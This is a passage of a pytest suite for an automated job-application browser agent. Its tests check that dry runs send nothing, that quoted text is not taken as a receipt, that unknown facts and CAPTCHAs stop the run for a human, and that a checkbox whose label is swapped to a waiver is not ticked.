    ("Le message indiquera que votre candidature est enregistrée", False), ("Your application must be received first", False),
    ("The banner reads your application was submitted", False), ("Votre candidature va être envoyée", False),
    ("Votre candidature a bien été envoyée. L'étape suivante s'affichera bientôt.", True), ("Thanks for applying. We will contact you.", True),
    ("Merci d'avoir postulé chez l'Entreprise", True), ("Your application has been received", True),
])
def test_quoted_or_reported_receipt_phrases_are_no_receipt(text, ok):
    assert confirmation_evidence(text) is ok


async def test_dry_run_guard_blocks_a_post_navigation_even_before_any_data_entry(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "choices", '<form id=f method="post" action="/apply"><label for=s>Pays</label>'
                                 '<select id=s name=s><option value="fr" selected>France</option><option value="be">Belgique</option></select>'
                                 '<button type="button" onclick="document.getElementById(\'f\').requestSubmit()">Continuer</button></form>')
    res = await go(page, server, ScriptedPlanner([open_continuer, StepPlan(page_kind="other")]), tmp_path, cv_pdf, start="choices", max_steps=3)
    assert not server.posts and not server.sent and res.status == "ready"


# ================================================================== seventh review round
# ------------------------------------------------------------------ 1. validation errors take precedence over "continuation"
RERENDER = ('<form onsubmit="event.preventDefault();' + POST_JS + ';'
            'var c=document.getElementById(\'c\');c.outerHTML=\'<input id=c2 name=email2 {invalid}>\';'
            'document.querySelector(\'label[for=c]\').textContent=\'E-mail professionnel *\';document.querySelector(\'label[for=c]\').setAttribute(\'for\',\'c2\');'
            'document.getElementById(\'bt\').textContent=\'Envoyer ma candidature\';{banner}">'
            '<label for=a>Prénom *</label><input id=a name=first_name><label for=b>Nom *</label><input id=b name=last_name>'
            '<label for=c>E-mail *</label><input id=c name=email><span id=e></span><div id=bn></div>'
            '<button id=bt type="submit">Suivant</button></form>')


def fields_then_any_button(snap):
    return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"), act(snap, r"^Nom", "fill", "last_name"),
                                               act(snap, r"E-mail", "fill", "email"), act(snap, r"Suivant|Envoyer", "click", role="next")])


@pytest.mark.parametrize("name,invalid,banner", [
    ("field_error", 'aria-invalid=true aria-describedby=e', "document.getElementById('e').textContent='Adresse refusée'"),
    ("alert_banner", "", "document.getElementById('bn').innerHTML='<div role=alert>Veuillez corriger les erreurs du formulaire</div>'"),
    ("error_class_banner", "", "document.getElementById('bn').innerHTML='<div class=alert-danger>Erreur : informations invalides</div>'"),
])
async def test_a_validation_re_render_is_never_a_distinct_next_step(page, server, fast, cv_pdf, tmp_path, name, invalid, banner):
    await serve(page, "rerender", RERENDER.replace("{invalid}", invalid).replace("{banner}", banner))
    planner = ScriptedPlanner([fields_then_any_button])
    res = await go(page, server, planner, tmp_path, cv_pdf, start="rerender", mode="submit", on_nav_click=no_reasons, max_steps=6)
    assert len(apply_posts(server)) == 1 and len(planner.calls) == 1
    assert res.status == "failed" and OWNER_MSG in res.message and res.submit_clicked


async def test_a_clean_re_render_is_still_a_continuation(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "rerender", RERENDER.replace("{invalid}", "").replace("{banner}", ""))
    planner = ScriptedPlanner([fields_then_any_button, planner_down])
    res = await go(page, server, planner, tmp_path, cv_pdf, start="rerender", mode="submit", on_nav_click=no_reasons, max_steps=6)
    assert len(planner.calls) == 2 and not res.submit_clicked and len(apply_posts(server)) == 1


# ------------------------------------------------------------------ 2. dynamic combobox: strict option, read-back
COMBO_DYNAMIC = ('<form method="post" action="/apply"><label for=fn>Prénom *</label><input id=fn name=first_name required>'
                 '<label for=w>Are you authorized to work? *</label><input id=w role=combobox aria-expanded=false autocomplete=off>'
                 '<div id=lb role=listbox hidden></div><button type="submit">Envoyer ma candidature</button></form>'
                 '<script>const w=document.getElementById("w"),lb=document.getElementById("lb");'
                 'w.addEventListener("focus",()=>setTimeout(()=>{lb.innerHTML=OPTIONS;lb.hidden=false},40));'
                 'lb.addEventListener("click",e=>{if(e.target.matches("[role=option]")){w.value=PICK(e.target.textContent);lb.hidden=true}});</script>')


def combo_page(options, pick="(t => t)"):
    return COMBO_DYNAMIC.replace("OPTIONS", "'" + "".join(f"<div role=option>{o}</div>" for o in options) + "'").replace("PICK", pick)


def work_facts():
    facts = extra_facts()
    facts.facts.append(Fact(key="auth", label="Autorisation de travail", value="Yes"))
    return facts


def auth_plan():
    return deduce_plan(lambda s: act(s, r"authorized", "select", "auth", "Yes"))


async def test_dynamic_combobox_never_picks_a_qualified_option_by_substring(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "dyn", combo_page(["Yes, with sponsorship"]))
    res = await go(page, server, ScriptedPlanner([auth_plan()]), tmp_path, cv_pdf, start="dyn", facts=work_facts(), verifier=FakeVerifier(lambda i: "supported"))
    assert await page.input_value("#w") == "" and res.status == "needs_input" and "Are you authorized to work?" in {q.label for q in res.questions}
    assert not any(f.label.startswith("Are you") for f in res.steps[0].filled)


async def test_dynamic_combobox_picks_the_strictly_equal_option_and_logs_the_live_label(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "dyn", combo_page(["Yes, with sponsorship", "Yes"]))
    res = await go(page, server, ScriptedPlanner([auth_plan()]), tmp_path, cv_pdf, start="dyn", facts=work_facts(), verifier=FakeVerifier(lambda i: "supported"))
    assert await page.input_value("#w") == "Yes" and filled_of(res, "Are you authorized to work?").value == "Yes"


async def test_combobox_read_back_that_differs_is_a_failure_and_the_field_is_cleared(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "dyn", combo_page(["Yes"], pick="(t => t + ', with sponsorship')"))   # the page stores something else than the option
    res = await go(page, server, ScriptedPlanner([auth_plan()]), tmp_path, cv_pdf, start="dyn", facts=work_facts(), verifier=FakeVerifier(lambda i: "supported"))
    assert await page.input_value("#w") == "" and res.status == "needs_input" and not any(f.label.startswith("Are you") for f in res.steps[0].filled)


async def test_native_select_read_back_is_what_gets_logged(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "sel", '<form method="post" action="/apply"><label for=fn>Prénom *</label><input id=fn name=first_name required>'
                             '<label for=s>Situation *</label><select id=s name=s required onchange="this.selectedIndex=2"><option value="">Choisir...</option>'
                             '<option value="alt">Alternance</option><option value="stage">Stage</option></select>'
                             '<button type="submit">Envoyer ma candidature</button></form>')
    plan = deduce_plan(lambda s: act(s, r"Situation", "select", "situation", "Alternance"))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="sel", verifier=FakeVerifier(lambda i: "supported"))
    assert res.status == "needs_input" and not any(f.label == "Situation" for f in res.steps[0].filled)   # the page swapped the choice: failed


# ------------------------------------------------------------------ 3. vehicle wording
@pytest.mark.parametrize("label,hard", [
    ("Do you have access to a car?", True), ("Can you bring your own car?", True), ("Disposez-vous d'un véhicule ?", True),
    ("Êtes-vous véhiculé(e) ?", True), ("Avez-vous accès à une voiture ?", True), ("Do you have a motorbike or moto?", True),
    ("Scooter ?", True), ("Deux-roues", True), ("Means of transport", True), ("Own transport", True), ("Moyen de transport", True),
    ("Transport personnel", True), ("Automobile", True), ("Vehicle", True),
    ("Votre carrière", False), ("Career goals", False), ("Card number", False), ("Carte de visite", False), ("Cargo", False), ("Caractère", False),
    ("Careers page", False), ("Statut auto-entrepreneur", False), ("Transports en commun appréciés ?", False) if False else ("Message", False),
])
def test_vehicle_wordings_are_hard_facts(label, hard):
    from jobhunt.apply.answer_check import is_hard_fact
    assert is_hard_fact(label) is hard


async def test_a_vehicle_question_without_a_fact_is_a_question_even_when_plausible(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "veh", '<form method="post" action="/apply"><label for=fn>Prénom *</label><input id=fn name=first_name required>'
                             '<label for=v>Can you bring your own car? *</label><select id=v name=v required><option value="">Choisir...</option>'
                             '<option value="o">Oui</option><option value="n">Non</option></select>'
                             '<button type="submit">Envoyer ma candidature</button></form>')
    plan = deduce_plan(lambda s: inferred(act(s, r"own car", "select", None, "Oui"), "mobile"))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="veh", verifier=FakeVerifier(lambda i: "plausible"))
    assert await page.input_value("#v") == "" and res.status == "needs_input" and "Can you bring your own car?" in {q.label for q in res.questions}


# ------------------------------------------------------------------ 4. quotes on the full text, reporting across lines
@pytest.mark.parametrize("text,ok", [
    ("Look for “Status: your application has been received.”", False),
    ("Le message indique :\nVotre candidature a bien été envoyée.", False), ("The message should read:\nYour application has been received.", False),
    ('Look for "Your application has been received', False), ("Texte attendu : « Votre candidature a bien été envoyée. »", False),
    ("Look for `Status: Your application has been received.`", False),
    ("Votre candidature a bien été envoyée.\nVous recevrez un e-mail.", True), ("We will review it.\nYour application has been received.", True),
    ("Merci.\nVotre candidature est enregistrée.", True), ("Merci d'avoir postulé.\nNous reviendrons vers vous.", True),
])
def test_quotes_are_blanked_on_the_full_text_and_reporting_carries_over_a_line_break(text, ok):
    assert confirmation_evidence(text) is ok


# ------------------------------------------------------------------ 5. the frame that navigates decides, and choices count
def third_party(server):
    return server.base.replace("127.0.0.1", "thirdparty.test")


async def test_dry_run_aborts_a_post_from_an_application_iframe_to_another_site(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "appframe", '<iframe src="/innerform" style="width:700px;height:300px"></iframe>')
    await serve(page, "innerform", f'<form id=f method="post" action="{third_party(server)}/apply"><label for=a>Message</label><input id=a name=msg>'
                                   '<button type="button" onclick="document.getElementById(\'f\').requestSubmit()">Continuer</button></form>')
    res = await go(page, server, ScriptedPlanner([open_continuer, StepPlan(page_kind="other")]), tmp_path, cv_pdf, start="appframe", max_steps=3)
    assert not server.posts and res.status == "ready", (res.message, res.steps[-1].note)


async def test_dry_run_refuses_the_click_of_a_choice_only_draft_in_an_application_iframe(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "appframe", '<iframe src="/innerform" style="width:700px;height:300px"></iframe>')
    await serve(page, "innerform", f'<form id=f method="post" action="{third_party(server)}/apply"><label for=s>Pays</label>'
                                   '<select id=s name=s><option value="fr" selected>France</option><option value="be">Belgique</option></select>'
                                   '<button type="submit">Continuer</button></form>')
    res = await go(page, server, ScriptedPlanner([open_continuer, StepPlan(page_kind="other")]), tmp_path, cv_pdf, start="appframe", max_steps=3)
    assert not server.posts and res.status == "ready" and res.steps[-1].clicked == ""


async def test_checked_boxes_and_radios_of_the_same_form_count_too(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "boxes", '<form method="post" action="/apply"><label><input type=checkbox name=c checked> Je confirme</label>'
                               '<button type="submit">Continuer</button></form>')
    res = await go(page, server, ScriptedPlanner([open_continuer]), tmp_path, cv_pdf, start="boxes", max_steps=3)
    assert res.status == "ready" and not server.posts and res.steps[-1].clicked == ""


async def test_a_language_picker_elsewhere_does_not_block_the_apply_click(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "adpage", '<header><select aria-label="Langue"><option selected>Français</option><option>English</option></select></header>'
                                '<main><button type="button" onclick="document.title=\'clic\'">Postuler</button></main>')
    plan = lambda snap: StepPlan(page_kind="job_page", actions=[act(snap, r"Postuler", "click", role="open_form")])  # noqa: E731
    res = await go(page, server, ScriptedPlanner([plan, StepPlan(page_kind="other")]), tmp_path, cv_pdf, start="adpage", max_steps=3)
    assert res.steps[0].clicked == "Postuler"


async def test_a_third_party_widget_frame_may_post_while_loading(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "recruitee", f'<h1>Offre</h1><iframe src="{third_party(server)}/widget_post" style="width:300px;height:100px"></iframe>')
    class Slow(ScriptedPlanner):   # gives the widget frame time to load and POST while the run is in progress
        async def plan(self, *a, **k):
            await asyncio.sleep(1.5)
            return await super().plan(*a, **k)
    planner = Slow([StepPlan(page_kind="closed")])
    res = await go(page, server, planner, tmp_path, cv_pdf, start="recruitee", max_steps=3)
    assert res.status == "blocked" and server.posts_to("/widget_hit") and len(planner.calls) == 1, (server.requests, res.message)


# ================================================================== eighth review round
# ------------------------------------------------------------------ 1. any error-styled container is an error, whatever its wording
@pytest.mark.parametrize("banner", [
    "document.getElementById('bn').innerHTML='<div role=alert>Échec de l\\'envoi</div>'",
    "document.getElementById('bn').innerHTML='<div aria-live=assertive>Compte non vérifié</div>'",
    "document.getElementById('bn').innerHTML='<div class=x-failure>Compte non vérifié</div>'",
    "document.getElementById('bn').innerHTML='<div class=alert-warning>Compte non vérifié</div>'",
    "document.getElementById('bn').innerHTML='<div class=message>Please try again</div>'",
    "document.getElementById('bn').innerHTML='<div class=notice>Champ manquant</div>'",
])
async def test_an_error_container_is_an_error_whatever_its_wording(page, server, fast, cv_pdf, tmp_path, banner):
    await serve(page, "rerender", RERENDER.replace("{invalid}", "").replace("{banner}", banner))
    planner = ScriptedPlanner([fields_then_any_button])
    res = await go(page, server, planner, tmp_path, cv_pdf, start="rerender", mode="submit", on_nav_click=no_reasons, max_steps=6)
    assert len(apply_posts(server)) == 1 and len(planner.calls) == 1
    assert res.status == "failed" and OWNER_MSG in res.message and res.submit_clicked


@pytest.mark.parametrize("banner", [
    "document.getElementById('bn').innerHTML='<div class=alert-success>Compte vérifié</div>'",
    "document.getElementById('bn').innerHTML='<div class=message>Étape suivante</div>'",
])
async def test_success_and_neutral_containers_are_not_errors(page, server, fast, cv_pdf, tmp_path, banner):
    await serve(page, "rerender", RERENDER.replace("{invalid}", "").replace("{banner}", banner))
    planner = ScriptedPlanner([fields_then_any_button, planner_down])
    res = await go(page, server, planner, tmp_path, cv_pdf, start="rerender", mode="submit", on_nav_click=no_reasons, max_steps=6)
    assert len(planner.calls) == 2 and not res.submit_clicked


async def test_an_error_banner_vetoes_the_receipt_classification(page, server, fast, cv_pdf, tmp_path):
    server.post_pages["/apply"] = "confirm_with_alert.html"
    res = await go(page, server, ScriptedPlanner([job_plan, form_plan("submit"), CONFIRMED]), tmp_path, cv_pdf, mode="submit")
    assert len(apply_posts(server)) == 1 and res.status == "failed" and res.submit_clicked


# ------------------------------------------------------------------ 2. live resolution of radios / selects / boxes
RADIO_PAGE = ('<form method="post" action="/apply"><label for=fn>Prénom *</label><input id=fn name=first_name required oninput="{move}">'
              '<fieldset id=g><legend>Êtes-vous autorisé à travailler ? *</legend>'
              '<label><input type=radio name=a value=yes required {onyes}> Yes</label><label><input type=radio name=a value=no id=rno> No</label></fieldset>'
              '<button type="submit">Envoyer ma candidature</button></form>')
MOVE_NO_FIRST = "var g=document.getElementById('g');g.insertBefore(g.lastElementChild,g.children[1])"


def radio_facts():
    facts = extra_facts()
    facts.facts.append(Fact(key="auth2", label="Autorisation", value="Yes"))
    return facts


def radio_plan():
    return deduce_plan(lambda s: act(s, r"autorisé", "select", "auth2", "Yes"))


async def test_a_radio_group_reordered_by_the_page_still_gets_the_validated_answer(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "radios", RADIO_PAGE.format(move=MOVE_NO_FIRST, onyes=""))
    res = await go(page, server, ScriptedPlanner([radio_plan()]), tmp_path, cv_pdf, start="radios", facts=radio_facts(), verifier=None)
    assert await page.evaluate("document.querySelector('input[name=a]:checked').value") == "yes"
    assert filled_of(res, "Êtes-vous autorisé à travailler ?").value == "Yes" and not filled_of(res, "Êtes-vous autorisé à travailler ?").inferred


async def test_a_radio_that_ends_up_on_the_wrong_answer_stops_the_step_with_a_question(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "radios", RADIO_PAGE.format(move="", onyes="onchange=\"document.getElementById('rno').checked=true\""))
    res = await go(page, server, ScriptedPlanner([radio_plan()]), tmp_path, cv_pdf, start="radios", facts=radio_facts(), verifier=None, mode="submit")
    assert res.status == "needs_input" and not server.posts and not any(f.label.startswith("Êtes-vous") for f in res.steps[0].filled)
    assert not res.steps[0].clicked


async def test_a_checkbox_whose_label_changed_since_the_read_is_not_ticked(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "boxlabel", '<form method="post" action="/apply"><label for=fn>Prénom *</label>'
                                  '<input id=fn name=first_name required oninput="document.getElementById(\'lb\').textContent=\'Je renonce à tout recours\'">'
                                  '<label><input type=checkbox name=c required> <span id=lb>J\'accepte la politique de confidentialité</span></label>'
                                  '<button type="submit">Envoyer ma candidature</button></form>')
    plan = deduce_plan(lambda s: act(s, r"confidentialité", "check", "consent_required"))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="boxlabel")
    assert not await page.is_checked("input[name=c]") and res.status == "needs_input"


# ------------------------------------------------------------------ 3. own means of transport is a hard fact, willingness is not
@pytest.mark.parametrize("label,hard", [
    ("Disposez-vous de votre propre moyen de déplacement ?", True), ("Moyen de déplacement", True), ("Propre véhicule", True),
    ("Do you have your own transportation?", True), ("Own means of transport", True), ("Personal vehicle", True), ("Personal transport", True),
    ("Véhicule personnel", True), ("Êtes-vous mobile par vos propres moyens ?", True), ("Êtes-vous autonome dans vos déplacements ?", True),
    ("Êtes-vous prêt à vous déplacer ?", False), ("Acceptez-vous des déplacements ?", False), ("Mobilité géographique", False),
    ("Willing to travel or relocate?", False), ("Déplacements fréquents acceptés ?", False),
])
def test_own_transport_concepts_are_hard_but_willingness_is_not(label, hard):
    from jobhunt.apply.answer_check import is_hard_fact
    assert is_hard_fact(label) is hard


async def test_own_transport_question_is_never_guessed(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "depl", '<form method="post" action="/apply"><label for=fn>Prénom *</label><input id=fn name=first_name required>'
                              '<label for=v>Disposez-vous de votre propre moyen de déplacement ? *</label><select id=v name=v required><option value="">Choisir...</option>'
                              '<option value="o">Oui</option><option value="n">Non</option></select>'
                              '<button type="submit">Envoyer ma candidature</button></form>')
    plan = deduce_plan(lambda s: inferred(act(s, r"moyen de déplacement", "select", None, "Oui"), "mobile"))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="depl", verifier=FakeVerifier(lambda i: "plausible"))
    assert await page.input_value("#v") == "" and res.status == "needs_input"


# ------------------------------------------------------------------ 4. associated controls and GET form submissions (dry run)
async def test_a_checked_box_associated_to_the_form_from_outside_counts(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "outbox", '<form id=f method="get" action="/form"><button type="submit">Continuer</button></form>'
                                '<input type=checkbox form=f name=c checked id=c><label for=c>Je confirme</label>')
    res = await go(page, server, ScriptedPlanner([open_continuer, StepPlan(page_kind="other")]), tmp_path, cv_pdf, start="outbox", max_steps=3)
    assert res.status == "ready" and not server.sent and res.steps[-1].clicked == ""


async def test_a_get_form_submission_is_aborted_in_dry_run_but_links_keep_working(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "getform", '<form method="get" action="/form"><input type=hidden name=x value=1><button type="submit">Continuer</button></form>')
    res = await go(page, server, ScriptedPlanner([open_continuer, StepPlan(page_kind="other")]), tmp_path, cv_pdf, start="getform", max_steps=3)
    assert res.status == "ready" and not server.sent
    await serve(page, "adlink", '<a class="btn" href="/form">Postuler</a>')
    plan = lambda snap: StepPlan(page_kind="job_page", actions=[act(snap, r"Postuler", "click", role="open_form")])  # noqa: E731
    await go(page, server, ScriptedPlanner([plan, StepPlan(page_kind="other")]), tmp_path, cv_pdf, start="adlink", max_steps=3)
    assert any(r.split("?")[0] == "/form" for r in server.requests)


# ------------------------------------------------------------------ 5. directional single quotes
@pytest.mark.parametrize("text,ok", [
    ("Look for ‘Status. Your application has been received.", False), ("Look for ‘Your application has been received’.", False),
    ("The page says ‘Merci. Votre candidature a bien été envoyée.’", False),
    ("Merci d’avoir postulé.", True), ("Votre candidature a bien été envoyée. L’étape suivante arrive.", True),
    ("Thanks for applying. It’s done.", True),
])
def test_directional_single_quotes_open_a_quotation(text, ok):
    assert confirmation_evidence(text) is ok


# ================================================================== first real sends
TEAMTAILOR = ("Thanks for applying We have received your application and we will be reviewing it shortly. Have someone who can be a reference? "
              "Let us know. Applied 2 Connect Stand out from the crowd Present yourself with a richer profile and stay up-to-date with future "
              "opportunities that match your interests. By connecting, I agree that I have read the Privacy Policy and that I may receive "
              "updates from Exemple SA about future job opportunities. * Yes, Exemple SA can contact me directly about specific future job "
              "opportunities. Connect")


@pytest.mark.parametrize("text,ok", [
    (TEAMTAILOR, True), ("Thanks for applying", True), ("Thank you for applying", True), ("Merci d'avoir postulé", True),
    ("Merci pour votre candidature", True), ("We have received your application and we will be reviewing it shortly.", True),
    ("Thank you for applying, you will hear from us soon.", True), ("Votre candidature est enregistrée, nous reviendrons vers vous.", True),
    ("Once we have received your application we will review it", False), ("You will see: thank you for applying", False),
    ("Please confirm we have received your application", False), ("When your application has been received you will hear from us", False),
    ("Have we received your application?", False),
])
def test_a_receipt_is_not_vetoed_by_a_marker_that_follows_it(text, ok):
    assert confirmation_evidence(text) is ok


@pytest.mark.parametrize("page_name", ["tt_confirmation_plain", "tt_confirmation_rich"])
async def test_a_receipt_page_with_an_optional_upsell_form_is_a_receipt(page, server, fast, cv_pdf, tmp_path, page_name):
    server.post_pages["/apply"] = page_name + ".html"
    res = await go(page, server, ScriptedPlanner([job_plan, form_plan("submit"), CONFIRMED]), tmp_path, cv_pdf, mode="submit")
    assert len(apply_posts(server)) == 1 and page.url.endswith("/application") and res.status == "submitted", res.message


async def test_the_upsell_page_is_not_a_receipt_when_the_application_form_is_still_there(page, server, fast, cv_pdf, tmp_path):
    # the same upsell form next to the UNCHANGED application form: no receipt (the filled fields are still on the page)
    await serve(page, "stillform", ASYNC_FORM.format(extra="") + "<p>Thanks for applying We have received your application.</p>")
    res = await go(page, server, ScriptedPlanner([three_fields_then_next, CONFIRMED]), tmp_path, cv_pdf, start="stillform", mode="submit",
                   on_nav_click=no_reasons)
    assert res.status == "failed" and res.submit_clicked


# ------------------------------------------------------------------ CAPTCHA the engine does not know
@pytest.mark.parametrize("mode", ["dry_run", "submit"])
async def test_an_unknown_captcha_widget_stops_the_run_before_anything_is_sent(page, server, fast, cv_pdf, tmp_path, mode):
    planner = ScriptedPlanner([form_plan("submit")])
    res = await go(page, server, planner, tmp_path, cv_pdf, start="iconcaptcha", mode=mode)
    assert res.status == "needs_human" and not res.submit_clicked and not server.posts and not planner.calls


async def test_a_solved_icon_captcha_lets_the_run_continue(page, server, fast, cv_pdf, tmp_path):
    planner = ScriptedPlanner([StepPlan(page_kind="closed")])
    res = await go(page, server, planner, tmp_path, cv_pdf, start="iconcaptcha_solved")
    assert res.status == "blocked" and len(planner.calls) == 1
